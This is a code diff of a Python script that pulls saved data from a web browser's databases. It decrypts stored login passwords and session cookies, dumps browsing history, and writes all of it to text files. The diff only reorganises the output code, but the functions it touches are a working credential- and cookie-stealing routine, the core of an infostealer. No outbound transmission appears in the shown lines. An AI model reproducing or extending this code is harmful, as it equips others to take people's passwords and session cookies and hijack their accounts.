@@ -34,10 +34,9 @@ def passDecrypt(buff: bytes, key: bytes):
         return False
 
 
-def resOut(data):
-    with open('info.txt', 'w') as f:
-        print(tabulate.tabulate(data))
-        f.write(tabulate.tabulate(data))
+def resOut(data, name: str) -> None:
+    with open(f'{name}.txt', 'w', errors='replace') as f:
+        f.write(tabulate.tabulate(data, maxcolwidths=[300, 300]))
 
 
 def dbWrapper(func):
@@ -68,7 +67,7 @@ def dbWrapper(func):
 
 
 @dbWrapper
-def getInfo(cursor):
+def getInfo(cursor) -> None:
     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
     data = [['URL', 'NAME', 'PASSWORD']]
     for i in cursor.fetchall():
@@ -78,26 +77,24 @@ def getInfo(cursor):
         if decryptedPass:
             data.append([url, username, decryptedPass])
 
-    resOut(data)
+    resOut(data, 'Info')
 
 
 @dbWrapper
-def getHistory(cursor):
+def getHistory(cursor) -> None:
     cursor.execute("SELECT title, url FROM urls")
-    with open('History.txt', "w") as f:
-        f.write(tabulate.tabulate(cursor.fetchall(), maxcolwidths=[None, 300]))
+    resOut(cursor.fetchall(), 'History')
 
 
 @dbWrapper
-def getCookie(cursor):
+def getCookie(cursor) -> None:
     cursor.execute("SELECT host_key, name, encrypted_value from cookies")
     data = [['URL', 'NAME', 'COOKIE']]
     for i in cursor.fetchall():
         url = i[0]
         name = i[1]
-        decryptedPass = passDecrypt(i[2], getKey())
-        if decryptedPass:
-            data.append([url, name, decryptedPass])
-    resOut(data)
+        cookie = passDecrypt(i[2], getKey())
+        if cookie:
+            data.append([url, name, cookie])
 
-
+    resOut(data, 'Cookie')
